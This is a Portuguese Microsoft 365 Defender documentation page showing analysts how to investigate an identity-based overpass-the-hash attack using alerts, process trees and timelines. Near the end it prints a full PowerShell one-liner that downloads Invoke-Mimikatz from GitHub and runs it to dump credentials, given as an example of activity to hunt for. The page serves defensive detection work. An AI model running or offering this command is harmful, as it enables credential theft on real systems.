---
title: Exemplo de um ataque baseado em identidade
description: Passo a passo de uma análise de exemplo de um ataque baseado em identidade.
keywords: incidentes, alertas, investigação, correlação, ataque, máquinas, dispositivos, usuários, identidades, identidade, caixa de correio, email, 365, microsoft, m365, resposta a incidentes, ataques cibernéticos
search.product: eADQiWindows 10XVcnh
ms.prod: m365-security
ms.mktglfcycl: deploy
ms.sitesec: library
ms.pagetype: security
f1.keywords:
- NOCSH
ms.author: josephd
author: JoeDavies-MSFT
localization_priority: Normal
manager: dansimp
audience: ITPro
ms.collection:
- M365-security-compliance
- m365initiative-m365-defender
ms.topic: conceptual
search.appverid:
- MOE150
- MET150
ms.technology: m365d
ms.openlocfilehash: 204530b8b4a87215053ddcb0434e40e45271da3d
ms.sourcegitcommit: 4fb1226d5875bf5b9b29252596855a6562cea9ae
ms.translationtype: MT
ms.contentlocale: pt-BR
ms.lasthandoff: 06/08/2021
ms.locfileid: "52841001"
---
# <a name="example-of-an-identity-based-attack"></a>Exemplo de um ataque baseado em identidade

[!INCLUDE [Microsoft 365 Defender rebranding](../includes/microsoft-defender.md)]

**Aplica-se a:**
- Microsoft 365 Defender

O Microsoft Defender for Identity pode ajudar a detectar tentativas mal-intencionadas de comprometer identidades em sua organização. Como o Defender for Identity se integra ao Microsoft 365 Defender, os analistas de segurança podem ter visibilidade sobre as ameaças que vêm do Defender para Identidade, como tentativas suspeitas de elevação de privilégio netlogon.

## <a name="analyzing-the-attack-in-microsoft-defender-for-identity"></a>Analisando o ataque no Microsoft Defender for Identity

Microsoft 365 O Defender permite que os analistas filtrem alertas por fonte de detecção na guia **Alertas** da página incidentes. No exemplo a seguir, a fonte de detecção é filtrada para **Defender for Identity**. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mdi-filter.png" alt-text="Exemplo de filtragem da fonte de detecção do Defender for Identity":::

Selecionar o alerta de ataque de passagem suspeita **de hash** vai para uma página no Microsoft Cloud App Security que exibe informações mais detalhadas. Você sempre pode saber mais sobre um alerta ou ataque selecionando [](/defender-for-identity/lateral-movement-alerts#suspected-overpass-the-hash-attack-kerberos-external-id-2002) **Saber** mais sobre esse tipo de alerta para ler uma descrição do ataque, bem como sugestões de correção.
 
:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-alert-example.png" alt-text="Exemplo de um alerta de ataque do overpass-the-hash suspeito"::: 

## <a name="investigating-the-same-attack-in-microsoft-defender-for-endpoint"></a>Investigando o mesmo ataque no Microsoft Defender para Ponto de Extremidade

Como alternativa, um analista pode usar o Defender para o Ponto de Extremidade para saber mais sobre a atividade em um ponto de extremidade. Selecione o incidente na fila de incidentes e selecione a **guia Alertas.** A partir daqui, eles também podem identificar a fonte de detecção. Uma fonte de detecção rotulada como EDR significa Detecção e Resposta do Ponto de Extremidade, que é o Defender para Ponto de Extremidade. A partir daqui, o analista seleciona um alerta detectado por EDR.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-edr.png" alt-text="Exemplo de detecção e resposta de ponto de extremidade no Defender para Ponto de Extremidade"::: 

A página de alerta exibe várias informações pertinentes, como o nome do dispositivo afetado, o nome de usuário, o status da investigação automática e os detalhes do alerta. O artigo de alerta mostra uma representação visual da árvore de processos. A árvore de processos é uma representação hierárquica dos processos pai e filho relacionados ao alerta.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-mde-tree.png" alt-text="Exemplo de uma árvore de processo de alerta no Defender para Ponto de Extremidade"::: 

Cada processo pode ser expandido para exibir detalhes adicionais. Os detalhes que um analista pode ver são os comandos reais que foram inseridos como parte de um script mal-intencionado, endereços IP de conexão de saída e outras informações úteis.

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-process-details.png" alt-text="Exemplo de detalhes do processo no Defender para Ponto de Extremidade":::
 
Selecionando **See na linha do tempo,** um analista pode fazer uma pesquisa ainda mais fundo para determinar a hora exata do comprometimento. 

O Microsoft Defender para Ponto de Extremidade pode detectar muitos arquivos e scripts mal-intencionados. No entanto, devido a muitos usos legítimos para conexões de saída, PowerShell e atividade de linha de comando, algumas atividades seriam consideradas benignas até que criasse um arquivo ou atividade mal-intencionada. Portanto, o uso da linha do tempo ajuda os analistas a colocar o alerta no contexto com a atividade ao redor para determinar a origem ou a hora original do ataque que, de outra forma, é obscurecida pelo sistema de arquivos comum e pela atividade do usuário. 

Para fazer isso, um analista iniciaria no momento da detecção de alerta (em vermelho) e rolaria para baixo no tempo para determinar quando a atividade original que levou à atividade mal-intencionada realmente começou. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-start-time.png" alt-text="Exemplo de início no momento da detecção de alerta"::: 

É importante compreender e distinguir atividades comuns, como conexões do Windows Update Windows, tráfego de ativação de software confiável, outras conexões comuns com sites da Microsoft, atividade de internet de terceiros, atividade Microsoft Endpoint Configuration Manager e outras atividades benignas contra atividades suspeitas. Uma maneira de fazer isso é usando filtros de linha do tempo. Há muitos filtros que podem realçar a atividade específica ao filtrar qualquer coisa que o analista não queira exibir. 

Na imagem abaixo, o analista filtrado para exibir apenas eventos de rede e processo. Isso permite que o analista veja as conexões de rede e os processos ao redor do evento em que Bloco de notas estabeleceu uma conexão com um endereço IP, que também vimos na árvore de processo. 

:::image type="content" source="../../media/first-incident-path-identity/first-incident-identity-notepad.png" alt-text="Exemplo de como Bloco de notas usado para fazer uma conexão de saída mal-intencionada"::: 

Nesse evento específico, Bloco de notas foi usado para fazer uma conexão de saída mal-intencionada. No entanto, muitas vezes os invasores simplesmente usarão iexplorer.exe estabelecer conexões para baixar uma carga mal-intencionada porque normalmente os processos iexplorer.exe são considerados atividade regular do navegador da Web.

Outro item a ser buscado na linha do tempo seria o Uso do PowerShell para conexões de saída. O analista procuraria conexões bem-sucedidas do PowerShell com comandos, como seguido de uma conexão de saída para um site que hospeda `IEX (New-Object Net.Webclient)` um arquivo mal-intencionado. 

No exemplo a seguir, o PowerShell foi usado para baixar e executar Mimikatz de um site:

```powershell
IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/mattifestation/PowerSploit/master/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz -DumpCreds
```
Um analista pode pesquisar rapidamente palavras-chave digitando na palavra-chave na barra de pesquisa para exibir somente eventos criados com o PowerShell. 

## <a name="next-step"></a>Próxima etapa

Consulte o [caminho da investigação de phishing.](first-incident-path-phishing.md)

## <a name="see-also"></a>Confira também

- [Visão geral dos incidentes](incidents-overview.md)
- [Gerenciar incidentes](manage-incidents.md)
- [Investigar incidentes](investigate-incidents.md)
